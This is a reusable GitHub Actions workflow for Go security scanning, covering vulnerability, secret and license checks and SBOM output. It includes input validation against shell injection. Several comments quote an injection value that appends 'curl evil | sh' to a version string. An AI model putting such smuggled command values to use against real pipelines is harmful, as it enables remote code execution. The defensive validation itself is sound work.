name: "Go Security"

# Reusable workflow for comprehensive Go security scanning
# Includes vulnerability detection, secret scanning, license checks, and SBOM generation
# Supports scheduled scans and manual triggering

on:
  workflow_call:
    inputs:
      runner_type:
        description: 'GitHub runner type to use'
        type: string
        default: 'blacksmith-4vcpu-ubuntu-2404'
      go_version:
        description: 'Go version to use for security scanning'
        type: string
        default: '1.23'
      enable_dependency_review:
        description: 'Enable GitHub dependency review (PR only)'
        type: boolean
        default: true
      enable_gosec:
        description: 'Enable Gosec security scanner'
        type: boolean
        default: true
      enable_govulncheck:
        description: 'Enable Go official vulnerability database check'
        type: boolean
        default: true
      govulncheck_version:
        description: >-
          govulncheck version to install, as a Go module query. Pinned rather than `@latest` so that
          an upstream release cannot change what this workflow runs without anyone here choosing it:
          golang.org/x/vuln v1.8.0 raised its own `go` directive to 1.26.0 and broke every Go
          repository on this channel the day it landed, because the install step has no
          `continue-on-error` to soften it. The install itself runs under GOTOOLCHAIN=auto, so this
          default works at any go_version — it does NOT have to track it.
        type: string
        default: 'v1.7.0'
      enable_nancy:
        description: 'Enable Nancy dependency vulnerability scanner'
        type: boolean
        default: true
      enable_trivy:
        description: 'Enable Trivy filesystem security scanner'
        type: boolean
        default: true
      enable_secret_scan:
        description: 'Enable TruffleHog secret scanning'
        type: boolean
        default: true
      enable_license_check:
        description: 'Enable go-licenses compliance check'
        type: boolean
        default: true
      go_licenses_version:
        description: >-
          go-licenses version to install, as a Go module query. Pinned for the same reason as
          govulncheck_version: `@latest` is resolved against the toolchain actions/setup-go pins for
          the job, so an upstream release raising its own `go` directive past go_version breaks the
          install outright and there is no `continue-on-error` here to soften it. v1.6.0 declares
          `go 1.16` and installs anywhere today — this pin is what keeps that true tomorrow.
        type: string
        default: 'v1.6.0'
      enable_sbom:
        description: 'Enable SBOM (Software Bill of Materials) generation'
        type: boolean
        default: true
      trivy_severity:
        description: 'Trivy severity levels to report (comma-separated: CRITICAL,HIGH,MEDIUM,LOW,UNKNOWN)'
        type: string
        default: 'CRITICAL,HIGH'
      license_disallowed_types:
        description: 'Disallowed license types for go-licenses (comma-separated)'
        type: string
        default: 'forbidden,restricted'
      upload_sarif:
        description: 'Upload SARIF results to GitHub Security tab'
        type: boolean
        default: true
      fail_on_security_issues:
        description: 'Fail the workflow if critical security issues are found'
        type: boolean
        default: true

permissions:
  contents: read
  security-events: write

jobs:
  dependency-review:
    name: Dependency Review
    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
    if: github.event_name == 'pull_request' && inputs.enable_dependency_review

    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6

      - name: Dependency Review
        uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0
        with:
          fail-on-severity: moderate

  gosec:
    name: Gosec Security Scan
    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
    if: inputs.enable_gosec

    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6

      - name: Set up Go
        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
        with:
          go-version: ${{ inputs.go_version }}
          cache: true

      - name: Run Gosec Security Scanner
        uses: securego/gosec@deb54465fea23d19a77f037e11e6589021f8501d # v2.29.0
        with:
          args: '-no-fail -fmt sarif -out gosec-results.sarif ./...'

      - name: Upload Gosec SARIF
        if: always() && inputs.upload_sarif
        uses: github/codeql-action/upload-sarif@cdf488f595d80d6e07e03d4674febd5ab45fa938 # v4.37.9
        with:
          sarif_file: gosec-results.sarif
          category: gosec

  govulncheck:
    name: Go Vulnerability Check
    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
    if: inputs.enable_govulncheck

    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6

      - name: Set up Go
        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
        with:
          go-version: ${{ inputs.go_version }}
          cache: true

      - name: Install govulncheck
        env:
          # actions/setup-go exports GOTOOLCHAIN=local for the whole job, so `go install` of a tool
          # whose own `go` directive is newer than go_version REFUSES instead of upgrading. That is
          # right for the scan (it must analyse under the pinned toolchain) and wrong for BUILDING
          # the scanner, so the override is scoped to this step alone.
          GOTOOLCHAIN: auto
          # Never interpolated into the script body: `${{ }}` is substituted BEFORE the shell sees
          # the line, so a caller passing `v1.7.0; curl evil|sh` would be running commands, not
          # naming a version. As an env var it is data the shell expands, and the check below bounds
          # it to a module query even if a caller forwards something untrusted into this input.
          GOVULNCHECK_VERSION: ${{ inputs.govulncheck_version }}
        run: |
          # CHARSET FIRST, SHAPE SECOND, and in that order for a reason. A shape glob alone accepts
          # "v1.7.0; curl evil | sh" — its trailing * swallows the payload — and `grep -E` matches
          # LINE BY LINE, so a value whose first line is "v1.7.0" passes whatever follows the
          # newline. `case` tests the whole string at once, so rejecting every character outside
          # the module-query set closes both holes before the shape is considered.
          case "$GOVULNCHECK_VERSION" in
            *[!0-9A-Za-z.+_-]*)           bad=1 ;;
            latest|v[0-9]*.[0-9]*.[0-9]*) bad=  ;;
            *)                            bad=1 ;;
          esac
          if [ -n "$bad" ]; then
            echo "::error::govulncheck_version must be 'latest' or a vX.Y.Z module query, got '$GOVULNCHECK_VERSION'"
            exit 1
          fi
          go install "golang.org/x/vuln/cmd/govulncheck@$GOVULNCHECK_VERSION"

      - name: Run govulncheck
        run: govulncheck ./...

  nancy:
    name: Nancy Dependency Check
    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
    if: inputs.enable_nancy

    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6

      - name: Set up Go
        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
        with:
          go-version: ${{ inputs.go_version }}
          cache: true

      - name: Write go list to file
        run: go list -json -m all > go.list

      - name: Nancy vulnerability scan
        uses: sonatype-nexus-community/nancy-github-action@726e338312e68ecdd4b4195765f174d3b3ce1533 # v1.0.3
        with:
          nancyCommand: sleuth --loud
        continue-on-error: true

  trivy:
    name: Trivy Security Scan
    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
    if: inputs.enable_trivy

    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: ${{ inputs.trivy_severity }}

      - name: Upload Trivy SARIF
        if: always() && inputs.upload_sarif
        uses: github/codeql-action/upload-sarif@cdf488f595d80d6e07e03d4674febd5ab45fa938 # v4.37.9
        with:
          sarif_file: trivy-results.sarif
          category: trivy

  secret-scan:
    name: Secret Scanning
    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
    if: inputs.enable_secret_scan

    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
        with:
          fetch-depth: 0

      - name: TruffleHog OSS
        uses: trufflesecurity/trufflehog@f714bf454f350590f4a24c3ddb1aef02c35bf5b6 # v3.97.5
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD
          extra_args: --debug --only-verified

  license-check:
    name: License Check
    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
    if: inputs.enable_license_check

    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6

      - name: Set up Go
        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
        with:
          go-version: ${{ inputs.go_version }}
          cache: true

      - name: Install go-licenses
        env:
          # Building the tool is not the scan. actions/setup-go exports GOTOOLCHAIN=local job-wide,
          # which makes `go install` REFUSE a tool whose `go` directive is newer than go_version
          # instead of upgrading; the override is scoped to this step so the licence walk below
          # still runs under the pinned toolchain.
          GOTOOLCHAIN: auto
          # Data, never script: `${{ }}` is substituted before the shell sees the line.
          GO_LICENSES_VERSION: ${{ inputs.go_licenses_version }}
        run: |
          # Charset before shape — a shape glob alone accepts "v1.6.0; curl evil | sh" because its
          # trailing * swallows the payload, and `grep -E` would match line by line. `case` tests
          # the whole string at once.
          case "$GO_LICENSES_VERSION" in
            *[!0-9A-Za-z.+_-]*)           bad=1 ;;
            latest|v[0-9]*.[0-9]*.[0-9]*) bad=  ;;
            *)                            bad=1 ;;
          esac
          if [ -n "$bad" ]; then
            echo "::error::go_licenses_version must be 'latest' or a vX.Y.Z module query, got '$GO_LICENSES_VERSION'"
            exit 1
          fi
          go install "github.com/google/go-licenses@$GO_LICENSES_VERSION"

      - name: Check licenses
        env:
          # Data, never script. This predates the govulncheck work and was never flagged, which is
          # the argument FOR fixing it rather than against: an unflagged sink is still a sink, and
          # `${{ }}` is substituted before the shell sees the line either way.
          LICENSE_DISALLOWED_TYPES: ${{ inputs.license_disallowed_types }}
        run: |
          # go-licenses takes a comma-separated list of type names — forbidden, restricted,
          # reciprocal, notice, permissive, unencumbered, unknown — so nothing outside letters,
          # commas and word punctuation is a legitimate value. `case` tests the whole string, which
          # a shape glob with a trailing * or a line-by-line `grep -E` would not.
          case "$LICENSE_DISALLOWED_TYPES" in
            ''|*[!a-zA-Z,_-]*)
              echo "::error::license_disallowed_types must be a comma-separated list of go-licenses type names, got '$LICENSE_DISALLOWED_TYPES'"
              exit 1 ;;
          esac
          go-licenses check ./... --disallowed_types="$LICENSE_DISALLOWED_TYPES"

      - name: Generate license report
        run: |
          go-licenses report ./... > licenses.txt
          cat licenses.txt

      - name: Upload license report
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: license-report
          path: licenses.txt
          retention-days: 30

  sbom:
    name: Generate SBOM
    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
    if: inputs.enable_sbom

    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6

      - name: Set up Go
        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
        with:
          go-version: ${{ inputs.go_version }}
          cache: true

      - name: Generate SBOM
        uses: anchore/sbom-action@3ad7283483fc7af8ff2b4ea19663c2d5ca935e26 # v0.24.2
        with:
          format: spdx-json
          output-file: sbom.spdx.json

      - name: Upload SBOM
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: sbom
          path: sbom.spdx.json
          retention-days: 90

  security-summary:
    name: Security Summary
    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
    needs: [gosec, govulncheck, nancy, trivy, secret-scan, license-check, sbom]
    if: always()

    steps:
      - name: Check all security jobs
        run: |
          echo "Security Scan Results:"
          echo "  - Gosec: ${{ needs.gosec.result }}"
          echo "  - Govulncheck: ${{ needs.govulncheck.result }}"
          echo "  - Nancy: ${{ needs.nancy.result }}"
          echo "  - Trivy: ${{ needs.trivy.result }}"
          echo "  - Secret Scan: ${{ needs.secret-scan.result }}"
          echo "  - License Check: ${{ needs.license-check.result }}"
          echo "  - SBOM: ${{ needs.sbom.result }}"

          if [[ "${{ inputs.fail_on_security_issues }}" == "true" ]]; then
            if [[ "${{ needs.gosec.result }}" == "failure" ]] || \
               [[ "${{ needs.govulncheck.result }}" == "failure" ]] || \
               [[ "${{ needs.trivy.result }}" == "failure" ]] || \
               [[ "${{ needs.secret-scan.result }}" == "failure" ]] || \
               [[ "${{ needs.license-check.result }}" == "failure" ]]; then
              echo "⚠️ One or more critical security checks failed"
              exit 1
            fi
          fi

          echo "✅ Security scan completed"
